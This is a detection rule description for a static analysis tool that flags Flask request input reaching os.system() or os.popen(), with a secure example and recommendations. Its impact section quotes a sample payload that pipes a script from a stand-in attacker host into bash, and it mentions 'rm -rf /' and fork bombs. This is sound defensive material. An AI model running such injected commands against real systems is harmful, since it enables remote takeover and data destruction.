# Content
description: |
  This rule detects OS command injection in Flask applications where user-controlled
  input from HTTP request parameters reaches os.system(), os.popen(), os.popen2(),
  os.popen3(), or os.popen4(). These functions pass their argument to the system shell
  as a single string, so shell metacharacters (;, &&, |, $(), backticks) in user input
  are interpreted directly by /bin/sh.

  The rule uses taint analysis to trace data flow from Flask request sources across
  assignment chains, helper functions, and module boundaries. A simple grep for
  "os.system" misses the cases that matter most in real codebases -- where the
  vulnerable call is three function calls away from the route handler in a separate
  utility module. Code Pathfinder follows the full chain and only flags flows where
  attacker-controlled data actually reaches the shell call at argument position 0
  (.tracks(0)), not flows where the tainted value appears in unrelated parts of the code.

  os.system() and os.popen() are inherently more dangerous than subprocess with a list
  because they unconditionally invoke a shell. Even if you validate the input, a single
  missed edge case results in full command execution. The fix is to stop using these
  functions for user-influenced commands.

message: "User input flows to os.system() or os.popen(). Use subprocess with list arguments and shlex.quote()."

security_implications:
  - title: Arbitrary Command Execution
    description: |
      An attacker who controls the argument to os.system() can run any OS command
      with the privileges of the Flask process. A payload like
      "; curl http://attacker.com/shell.sh | bash" appended to a legitimate value
      exfiltrates data or installs a reverse shell in a single request.
  - title: Data Exfiltration and Lateral Movement
    description: |
      Once shell access is established, attackers read /etc/passwd, dump environment
      variables (which contain database credentials, API keys, and cloud IAM tokens
      in most container deployments), and pivot to internal network services that
      are not exposed to the internet.
  - title: Denial of Service
    description: |
      Injected commands like "rm -rf /" or fork bombs can crash the application server
      or the underlying host. Even "sleep 9999" blocks the Flask worker indefinitely,
      causing a process-exhaustion DoS that looks like a performance issue until
      someone reads the process list.
  - title: Persistence and Backdoor Installation
    description: |
      Attackers write cron jobs, modify startup scripts, or create new user accounts
      via injected commands. These persist across application restarts and can survive
      container image rebuilds if they reach a mounted volume.

secure_example: |
  from flask import Flask, request
  import subprocess
  import shlex

  app = Flask(__name__)

  @app.route('/ping')
  def ping_host():
      host = request.args.get('host', '')
      # SAFE: list arguments -- the shell is never invoked, no metacharacter risk
      result = subprocess.run(
          ['ping', '-c', '3', host],
          capture_output=True, text=True, timeout=10
      )
      return result.stdout

  @app.route('/dns')
  def dns_lookup():
      domain = request.args.get('domain', '')
      # SAFE: shlex.quote() wraps the value in single-quotes and escapes embedded quotes
      safe_domain = shlex.quote(domain)
      result = subprocess.check_output(f'nslookup {safe_domain}', shell=True, text=True)
      return result

recommendations:
  - Replace os.system() and os.popen() with subprocess.run() using a list of arguments so the shell is never invoked and metacharacters are passed literally to the program.
  - When a shell string is unavoidable, wrap every user-supplied value with shlex.quote() before interpolation -- it adds single-quote escaping that neutralizes metacharacters.
  - Validate input against an allowlist of expected values (hostnames, filenames, identifiers) before passing it to any system call.
  - Run the Flask process under a dedicated low-privilege OS user with no write access to sensitive directories and no ability to install packages or modify system files.
  - Set subprocess timeouts to prevent long-running injected commands from consuming worker processes indefinitely.

detection_scope: |
  Scope: global (cross-file taint tracking across the entire project).

  Sources: Flask HTTP input methods -- request.args.get(), request.form.get(),
  request.values.get(), request.get_json(), request.cookies.get(),
  request.headers.get() -- all of which carry attacker-controlled strings.

  Sinks: os.system(), os.popen(), os.popen2(), os.popen3(), os.popen4().
  The .tracks(0) setting focuses analysis on argument position 0, the command
  string. This is the position where shell injection occurs. Arguments at other
  positions (mode flags, buffer sizes) are not tracked.

  Sanitizers: shlex.quote() and shlex.split() are recognized as sanitizers.
  A flow through either function is treated as safe because shlex.quote()
  produces a shell-escaped string that cannot be broken out of, and shlex.split()
  tokenizes the input as a shell lexer would (useful for building argument lists).

  The rule traces data through variable assignments, return values, function
  arguments, and cross-file function calls. It does not trigger on hardcoded
  strings or values that can only originate from trusted configuration sources.

